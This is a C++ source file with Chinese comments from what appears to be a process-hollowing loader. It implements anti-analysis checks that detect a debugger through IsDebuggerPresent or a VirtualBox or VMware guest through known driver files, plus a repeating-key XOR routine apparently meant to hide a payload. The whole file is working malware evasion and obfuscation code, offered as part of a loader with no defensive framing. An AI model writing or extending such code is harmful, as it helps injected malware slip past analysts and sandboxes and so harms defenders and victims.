#include "../include/Security.h"

namespace Hollowing {
    /**
     * @brief 执行基本的反分析环境检测
     * 
     * 本实现包含：
     * 1. 基础反调试: IsDebuggerPresent。
     * 2. 基础反虚拟机: 检查系统关键驱动文件是否存在。
     */
    bool Security::CheckAnalysis() {
        LOG_INFO("正在扫描分析环境...");

        // 1. 检查是否存在调试器
        if (IsDebuggerPresent()) {
            LOG_ERROR("检测到调试器运行中!");
            return true;
        }

        // 2. 检查常见的虚拟机驱动 (VBox/VMware)
        const char* vmFiles[] = {
            "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
            "C:\\windows\\System32\\Drivers\\Vboxguest.sys",
            "C:\\windows\\System32\\Drivers\\Vboxmouse.sys"
        };

        for (const char* file : vmFiles) {
            if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
                LOG_ERROR("检测到虚拟机环境: " + std::string(file));
                return true;
            }
        }

        return false;
    }

    /**
     * @brief 实现 XOR 加密/解密
     * 
     * XOR 运算的特性是：数据 ^ 密钥 ^ 密钥 = 原始数据。
     * 因此该函数既可以用于加密，也可以用于解密。
     */
    void Security::XORCipher(std::vector<BYTE>& data, const std::string& key) {
        if (key.empty()) return;
        
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key.length()];
        }
    }
}
